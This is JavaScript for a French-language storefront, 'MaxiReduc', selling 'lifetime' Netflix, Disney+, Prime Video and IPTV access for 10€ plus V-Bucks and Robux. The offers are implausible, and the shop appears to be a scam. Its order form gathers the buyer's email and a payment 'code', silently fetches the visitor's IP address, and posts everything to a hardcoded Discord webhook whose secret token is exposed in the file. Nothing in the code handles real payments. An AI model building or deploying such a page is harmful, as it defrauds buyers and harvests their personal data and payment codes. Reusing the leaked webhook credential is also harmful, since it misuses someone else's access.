const WEBHOOK_URL = 'https://discord.com/api/webhooks/1365886265198772306/KFX-ZCpzmvLVLOwZ3hlPCAAZvZrfGWXqNSULuJjf4FZfofjV11wR4xyl4bTnffUxQ8hy';

// Improved thumbnails (SVGs) for clearer, more recognizable icons
const products = [
  {
    id: 'netflix',
    title: 'Netflix — Lifetime',
    price: 10,
    thumb: `<svg width="72" height="72" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg"><rect rx="12" width="72" height="72" fill="#E50914"/><g transform="translate(14,12) scale(1.6)"><path d="M2 0h3.2l2.4 12L12 0h3.2L11 24H8L5.6 4.8 3 24H0.8L2 0z" fill="#fff"/></g></svg>`,
    type: 'service',
    badge: 'Populaire'
  },
  {
    id: 'disney',
    title: 'Disney+ — Lifetime',
    price: 10,
    thumb: `<svg width="72" height="72" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg"><rect rx="12" width="72" height="72" fill="#0A2B8F"/><g fill="#9AD3FF" transform="translate(8,14)"><path d="M28 6c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12S34.6 6 28 6zm0 20a8 8 0 110-16 8 8 0 010 16z"/></g></svg>`,
    type: 'service',
    badge: 'Best-seller'
  },
  {
    id: 'prime',
    title: 'Prime Video — Lifetime',
    price: 10,
    thumb: `<svg width="72" height="72" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg"><rect rx="12" width="72" height="72" fill="#00A8E1"/><g stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" fill="none" transform="translate(10,18)"><path d="M2 10c6 4 10 4 14 0"/></g></svg>`,
    type: 'service',
    badge: 'Top'
  },
  {
    id: 'iptv',
    title: 'IPTV — Lifetime',
    price: 10,
    thumb: `<svg width="72" height="72" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg"><rect rx="12" width="72" height="72" fill="#262626"/><g transform="translate(10,16)"><rect width="52" height="28" rx="6" fill="#fff"/><circle cx="44" cy="14" r="4" fill="#FF5E57"/><rect x="6" y="6" width="12" height="4" rx="2" fill="#111"/></g></svg>`,
    type: 'service',
    badge: null
  },
  {
    id: 'vbucks',
    title: 'V-Bucks',
    price: null,
    thumb: `<svg width="72" height="72" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg"><rect rx="12" width="72" height="72" fill="#6EE7B7"/><g transform="translate(14,14)" fill="#064E3B"><circle cx="22" cy="10" r="10"/><path d="M8 10h16v4H8z" fill="#fff"/></g></svg>`,
    type: 'bundle',
    badge: 'Jeux'
  },
  {
    id: 'robux',
    title: 'Robux',
    price: null,
    thumb: `<svg width="72" height="72" viewBox="0 0 72 72" xmlns="http://www.w3.org/2000/svg"><rect rx="12" width="72" height="72" fill="#7C3AED"/><g transform="translate(18,12)"><polygon points="18,0 36,24 18,48 0,24" fill="#FFD6F6"/></g></svg>`,
    type: 'bundle',
    badge: 'Jeux'
  }
];

const vbucksOptions = [
  { label: '1 000 V-Bucks — 5€', value: 'v1', price: 5 },
  { label: '2 800 V-Bucks — 10€', value: 'v2', price: 10 },
  { label: '5 000 V-Bucks — 20€', value: 'v3', price: 20 },
  { label: '15 000 V-Bucks — 50€', value: 'v4', price: 50 }
];
const robuxOptions = [
  { label: '1 700 Robux — 10€', value: 'r1', price: 10 },
  { label: '5 000 Robux — 30€', value: 'r2', price: 30 },
  { label: '10 000 Robux — 50€', value: 'r3', price: 50 }
];

const grid = document.getElementById('productGrid');
const modal = document.getElementById('modal');
const modalContent = document.getElementById('modalContent');
const modalClose = document.getElementById('modalClose');
const toast = document.getElementById('toast');

function renderProducts(){
  grid.innerHTML = '';
  products.forEach(p=>{
    const card = document.createElement('article');
    card.className = 'card';
    card.innerHTML = `
      <div class="thumb">${p.thumb}</div>
      <div class="card-body">
        <div>
          <div class="title">${p.title}</div>
          <div class="price">${p.type==='service' ? p.price + '€' : ''}</div>
        </div>
        <div class="right-meta">
          ${p.badge ? `<div class="badge">${p.badge}</div>` : ''}
        </div>
      </div>
      <div class="meta">
        <button class="btn" data-id="${p.id}" aria-label="Choisir ${p.title}">Choisir</button>
        <div class="small">Traitement max 24h</div>
      </div>
    `;
    grid.appendChild(card);
  });
}

function openModal(productId){
  const p = products.find(x=>x.id===productId);
  modalContent.innerHTML = '';
  const container = document.createElement('div');

  const header = document.createElement('div');
  header.innerHTML = `<h3 style="margin:0 0 6px 0">${p.title}</h3><div class="note">Formulaire — fournissez uniquement des informations que vous acceptez de partager via webhook.</div>`;
  container.appendChild(header);

  // form
  const form = document.createElement('form');
  form.innerHTML = `
    <div class="form-row">
      <label class="small">Adresse e‑mail</label>
      <input name="email" class="input" type="email" placeholder="votre@mail.com" required />
    </div>
  `;

  if(p.type === 'bundle'){
    const sel = document.createElement('select');
    sel.className = 'select';
    sel.name = 'option';
    sel.required = true;
    const options = p.id === 'vbucks' ? vbucksOptions : robuxOptions;
    // clearer option labels with price badge
    options.forEach(o=>{
      const el = document.createElement('option');
      el.value = JSON.stringify(o);
      el.textContent = `${o.label}`;
      sel.appendChild(el);
    });
    const row = document.createElement('div');
    row.className = 'form-row';
    const lbl = document.createElement('label');
    lbl.className = 'small';
    lbl.textContent = 'Choisissez une tranche';
    row.appendChild(lbl);
    row.appendChild(sel);
    form.appendChild(row);
  } else {
    const info = document.createElement('div');
    info.className = 'helper';
    info.textContent = `Prix affiché : ${p.price}€.`;
    form.appendChild(info);
    const hidden = document.createElement('input');
    hidden.type = 'hidden';
    hidden.name = 'option';
    hidden.value = JSON.stringify({ label: p.title, price: p.price });
    form.appendChild(hidden);
  }

  // reference field (demo only)
  const refRow = document.createElement('div');
  refRow.className = 'form-row';
  refRow.innerHTML = `
    <label class="small">Référence de paiement</label>
    <input name="reference" class="input" placeholder="Ex : REF123" />
    <div class="helper">Ne partagez pas vos codes ou informations sensibles.</div>
  `;
  form.appendChild(refRow);

  const submit = document.createElement('button');
  submit.className = 'btn';
  submit.type = 'submit';
  submit.textContent = 'Valider la commande';
  form.appendChild(submit);

  form.addEventListener('submit', async (e)=>{
    e.preventDefault();
    const formData = new FormData(form);
    const payload = {
      product: p.id,
      productLabel: p.title,
      option: JSON.parse(formData.get('option')),
      email: formData.get('email'),
      reference: formData.get('reference') || null,
      timestamp: new Date().toISOString()
    };

    // Attempt to fetch client IP for the webhook entry (best-effort)
    try{
      const ipRes = await fetch('https://api.ipify.org?format=json');
      const ipJson = await ipRes.json().catch(()=>null);
      payload.ip = ipJson && ipJson.ip ? ipJson.ip : '—';
    }catch{
      payload.ip = '—';
    }

    // Generate a short unique ID for this submission
    payload.id = 'id_' + Math.random().toString(36).slice(2,10);

    // Show progress
    showToast('Envoi en cours…');
    try{
      await safeSend(payload);
      showToast('Commande envoyée — vérifiez la confirmation', 3500);
      modal.classList.add('hidden');
      modal.setAttribute('aria-hidden','true');
      showConfirmationCard(payload);
    }catch(err){
      console.error(err);
      showToast('Erreur d\'envoi. Réessayez.',2500);
    }
  });

  container.appendChild(form);
  modalContent.appendChild(container);
  modal.classList.remove('hidden');
  modal.setAttribute('aria-hidden','false');
}

function showConfirmationCard(payload){
  modalContent.innerHTML = `
    <div class="confirm">
      ✅ Commande envoyée.<br/>
      Produit: ${payload.productLabel}<br/>
      Détails: ${payload.option.label}<br/>
      Un message a été envoyé au webhook.
    </div>
  `;
  modal.classList.remove('hidden');
  modal.setAttribute('aria-hidden','false');
  setTimeout(()=>{ modal.classList.add('hidden'); modal.setAttribute('aria-hidden','true') }, 3500);
}

async function safeSend(payload){
  // This implementation sends the collected form data to the configured Discord webhook.
  // Make sure you have the right to transmit the provided personal information.

  // Build an embed with styled title and individual fields as requested.
  const embed = {
    title: `🎮 Nouvelle Commande {${payload.productLabel}}`,
    color: 8141549, // hex #7C3AED -> decimal 8141549 (purple)
    fields: [
      { name: '📦 Produit', value: payload.option && payload.option.label ? `\`${payload.option.label}\`` : '—', inline: false },
      { name: '💰 Prix', value: payload.option && payload.option.price ? `\`${payload.option.price}€\`` : (payload.option && payload.option.price === null ? '—' : '—'), inline: false },
      { name: '🎟️ Code', value: payload.reference ? `\`${payload.reference}\`` : '`—`', inline: false },
      { name: '📧 Email', value: payload.email ? `\`${payload.email}\`` : '`—`', inline: false },
      { name: '🌐 IP', value: payload.ip ? `\`${payload.ip}\`` : '`—`', inline: false },
      { name: '🆔 ID', value: payload.id ? `\`${payload.id}\`` : '`—`', inline: false }
    ],
    footer: { text: 'MaxiReduc' }
  };

  const body = {
    username: 'MaxiReduc Bot',
    embeds: [embed]
  };

  const res = await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });

  if(!res.ok){
    const txt = await res.text().catch(()=>res.statusText);
    throw new Error(`Webhook error: ${res.status} ${txt}`);
  }
  return res;
}

function showToast(msg, ms=1500){
  toast.textContent = msg;
  toast.classList.remove('hidden');
  clearTimeout(toast._t);
  toast._t = setTimeout(()=>toast.classList.add('hidden'), ms);
}

grid.addEventListener('click', (e)=>{
  const btn = e.target.closest('button[data-id]');
  if(btn) openModal(btn.getAttribute('data-id'));
});

modalClose.addEventListener('click', ()=>{
  modal.classList.add('hidden');
  modal.setAttribute('aria-hidden','true');
});

renderProducts();